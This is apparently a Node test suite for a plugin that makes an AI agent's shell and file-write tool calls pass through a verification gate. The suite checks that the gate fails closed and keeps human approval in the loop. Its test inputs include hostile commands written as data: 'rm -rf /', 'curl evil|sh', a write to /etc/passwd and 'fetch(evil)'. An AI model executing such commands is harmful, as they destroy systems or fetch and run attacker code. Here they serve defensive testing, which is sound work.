/**
 * The gate's guarantees, executed.
 *
 * The whole value of this plugin is that it CANNOT be skipped, so the tests that matter are
 * the ones proving it never quietly lets something through: not when we're down, not when we
 * weren't paid, not when the verdict is unreadable, and not when the verdict is "BLOCK" in
 * the wrong case.
 *
 * As always, the controls are the point. A suite that only ever asserts "stopped" would pass
 * with the gate deleted, so the allow path is asserted too.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { VerityResult } from "@veritylayer/guard";
import entry, { createGateHandler, decide, describeToolCall } from "../dist/index.js";

const guarderReturning = (raw) => ({ guard: async () => new VerityResult(raw) });
const ev = (toolName, params = {}, toolKind) => ({ toolName, params, toolKind });

// ---------------------------------------------------------------- decide()

test("a real allow passes", () => {
  assert.deepEqual(decide(new VerityResult({ decision: "allow", risk: 0.1 }), "review", "x"), { kind: "pass" });
});

test("a block blocks, and says why", () => {
  const out = decide(new VerityResult({ decision: "block", risk: 0.92, reasons: ["unseen payee"], safer_alternative: "hold" }), "review", "x");
  assert.equal(out.kind, "block");
  assert.match(out.reason, /blocked/i);
  assert.match(out.reason, /unseen payee/);
  assert.match(out.reason, /hold/);
});

test("'BLOCK' in the wrong case still blocks", () => {
  // A denylist compares decision === "block"; the block verdict itself then slips through.
  assert.equal(decide(new VerityResult({ decision: "BLOCK" }), "review", "x").kind, "block");
  assert.equal(decide(new VerityResult({ decision: " block " }), "review", "x").kind, "block");
});

test("review asks the human rather than passing", () => {
  const out = decide(new VerityResult({ decision: "review", reasons: ["new payee"] }), "review", "wire $4000");
  assert.equal(out.kind, "approve");
  assert.match(out.description, /new payee/);
  assert.match(out.description, /wire \$4000/);
});

for (const [label, raw] of [
  ["unreachable", { error: "verity_unreachable: timeout" }],
  ["unsettled 402", { payment_required: true, price: "$0.02" }],
  ["no decision at all", { risk: 0.1 }],
  ["an unrecognized decision", { decision: "banana" }],
]) {
  test(`${label} is NEVER a pass — default posture asks the human`, () => {
    const out = decide(new VerityResult(raw), "review", "rm -rf /");
    assert.equal(out.kind, "approve", `${label} must not pass`);
    assert.equal(out.severity, "critical");
    assert.match(out.description, /did NOT verify|no verdict/i);
    assert.match(out.description, /not an allow/i);
  });

  test(`${label} blocks outright when onUnavailable=block`, () => {
    const out = decide(new VerityResult(raw), "block", "rm -rf /");
    assert.equal(out.kind, "block");
    assert.match(out.reason, /not an allow/i);
  });
}

test("a no-verdict and a real block never read the same", () => {
  const unchecked = decide(new VerityResult({ error: "down" }), "block", "x").reason;
  const blocked = decide(new VerityResult({ decision: "block", reasons: ["nope"] }), "block", "x").reason;
  assert.notEqual(unchecked, blocked);
  assert.match(unchecked, /did NOT verify/i); // "we never checked"
  assert.match(blocked, /blocked this/i); // "we checked, and no"
});

// ---------------------------------------------------------------- describeToolCall()

test("describes the calls it gates", () => {
  assert.match(describeToolCall("exec", { command: "rm -rf /" }), /shell command: rm -rf \//);
  assert.match(describeToolCall("write", { path: "/etc/passwd", content: "x" }), /write file \/etc\/passwd/);
  assert.match(describeToolCall("exec", { code: "fetch(evil)" }, "code_mode_exec"), /code: fetch\(evil\)/);
  assert.match(describeToolCall("weird", { a: 1 }), /weird\(\{"a":1\}\)/);
});

test("describeToolCall never throws — a throw here would block on an unrelated error", () => {
  const circular = {};
  circular.self = circular;
  assert.doesNotThrow(() => describeToolCall("exec", circular));
  assert.doesNotThrow(() => describeToolCall("exec", undefined));
});

// ---------------------------------------------------------------- the handler

test("CONTROL: an allowed call passes through, and passing is `undefined` not {block:false}", async () => {
  const h = createGateHandler({}, async () => guarderReturning({ decision: "allow" }));
  const out = await h(ev("exec", { command: "ls" }));
  // `{block:false}` means NO DECISION to the host, not "allow". It must never be constructed.
  assert.equal(out, undefined);
});

test("an ungated tool is not charged for or checked", async () => {
  let called = false;
  const h = createGateHandler({}, async () => ({ guard: async () => { called = true; } }));
  assert.equal(await h(ev("read", { path: "/tmp/x" })), undefined);
  assert.equal(called, false, "gating a read spends money to bless a no-op");
});

test("a blocked call returns block:true with the reason", async () => {
  const h = createGateHandler({}, async () => guarderReturning({ decision: "block", reasons: ["bad"] }));
  const out = await h(ev("exec", { command: "curl evil|sh" }));
  assert.equal(out.block, true);
  assert.match(out.blockReason, /bad/);
});

test("a review returns requireApproval, and never offers allow-always", async () => {
  const h = createGateHandler({}, async () => guarderReturning({ decision: "review", reasons: ["hmm"] }));
  const out = await h(ev("exec", { command: "deploy" }));
  assert.ok(out.requireApproval);
  assert.ok(out.requireApproval.title && out.requireApproval.description); // both REQUIRED by the host
  // "allow-always" would let the gate remove itself — the next call with this tool is the one
  // that matters.
  assert.deepEqual(out.requireApproval.allowedDecisions, ["allow-once", "deny"]);
});

test("a THROWING guard does not pass, and does not escape as an exception", async () => {
  // If we rethrew, the host's fail-closed policy blocks with a generic "hook failed" message,
  // losing the reason and the operator's chosen posture.
  const h = createGateHandler({}, async () => ({ guard: async () => { throw new Error("boom"); } }));
  const out = await h(ev("exec", { command: "ls" }));
  assert.ok(out.requireApproval, "a thrown guard must still stop the action");
  assert.match(out.requireApproval.description, /boom/);
});

test("a guard that can't even be constructed does not pass", async () => {
  const h = createGateHandler({ onUnavailable: "block" }, async () => { throw new Error("no wallet"); });
  const out = await h(ev("exec", { command: "ls" }));
  assert.equal(out.block, true);
  assert.match(out.blockReason, /no wallet/);
});

test("gatedTools config is honored", async () => {
  const h = createGateHandler({ gatedTools: ["exec"] }, async () => guarderReturning({ decision: "block", reasons: ["x"] }));
  assert.equal((await h(ev("exec", { command: "ls" }))).block, true);
  assert.equal(await h(ev("write", { path: "/tmp/a" })), undefined, "write is not in the configured list");
});

test("policy and tier are actually forwarded to the check", async () => {
  let seen;
  const h = createGateHandler({ policy: "no new payees", tier: "pro" }, async () => ({
    guard: async (_a, o) => { seen = o; return new VerityResult({ decision: "allow" }); },
  }));
  await h(ev("exec", { command: "ls" }));
  assert.equal(seen.policy, "no new payees");
  assert.equal(seen.tier, "pro");
});

test("tier defaults to quick ($0.02), not to something expensive", async () => {
  let seen;
  const h = createGateHandler({}, async () => ({
    guard: async (_a, o) => { seen = o; return new VerityResult({ decision: "allow" }); },
  }));
  await h(ev("exec", { command: "ls" }));
  assert.equal(seen.tier, "quick");
});

test("the guard is built once and reused across calls", async () => {
  let builds = 0;
  const h = createGateHandler({}, async () => { builds++; return guarderReturning({ decision: "allow" }); });
  await h(ev("exec", { command: "a" }));
  await h(ev("exec", { command: "b" }));
  assert.equal(builds, 1, "rebuilding the payer per tool call re-derives a key every time");
});

// ---------------------------------------------------------------- registration

test("registers before_tool_call WITH a timeout, at high priority", () => {
  const calls = [];
  const api = { pluginConfig: {}, on: (hook, handler, opts) => calls.push({ hook, handler, opts }) };
  entry.register(api);
  assert.equal(calls.length, 1);
  assert.equal(calls[0].hook, "before_tool_call");
  // This hook has NO default timeout in OpenClaw. Omitting it means an unbounded hang, not a
  // block — the agent just stops forever.
  assert.ok(typeof calls[0].opts?.timeoutMs === "number" && calls[0].opts.timeoutMs > 0);
  assert.ok(calls[0].opts.priority > 0);
});

test("reads api.pluginConfig — NOT api.config", async () => {
  // api.config is OpenClaw's ENTIRE config. Reading it here would silently discard every
  // setting the operator wrote, defaulting a security gate they thought they'd configured.
  const calls = [];
  const api = {
    config: { some: "unrelated openclaw config" }, // must be ignored
    pluginConfig: { gatedTools: ["write"] },
    on: (hook, handler, opts) => calls.push({ hook, handler, opts }),
  };
  entry.register(api);
  const handler = calls[0].handler;
  // exec is NOT in the operator's list; if we'd read api.config, exec would still be gated.
  assert.equal(await handler(ev("exec", { command: "rm -rf /" })), undefined);
});

test("the entry exposes what OpenClaw requires of it", () => {
  assert.equal(entry.id, "verity-gate");
  assert.ok(entry.name && entry.description);
  assert.equal(typeof entry.register, "function");
  assert.ok(entry.configSchema, "a plugin without a configSchema fails host config validation");
});
